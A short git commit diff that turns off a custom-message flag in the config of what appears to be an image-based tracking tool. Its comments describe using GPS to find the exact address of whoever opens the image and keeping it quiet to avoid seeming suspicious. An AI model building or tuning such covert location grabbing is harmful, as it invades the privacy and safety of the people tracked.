da442d219611242b7883ac87679c21d2360a5868
yukiscool <yukiscool123@gmail.com>
2025-09-04 19:25:01 -0300

    Update verification.py

--- api/verification.py
+++ api/verification.py
@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "Who's a good boy? You are!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
